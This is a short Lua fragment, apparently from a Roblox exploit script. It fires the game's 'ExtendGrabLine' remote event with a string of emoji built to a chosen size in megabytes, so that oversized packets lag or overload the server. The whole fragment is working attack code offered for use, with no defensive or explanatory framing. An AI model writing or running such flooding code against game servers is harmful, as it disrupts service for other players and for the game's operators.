    local function sendPacket()
        local grab = ReplicatedStorage:FindFirstChild("GrabEvents")
        if not grab then return end
        local extend = grab:FindFirstChild("ExtendGrabLine")
        if not extend then return end
        local size = packetLagState.sizeMB
        local data = string.rep("😀", math.floor(size * 1000000 / 4))  -- approximate
        extend:FireServer(data)
    end

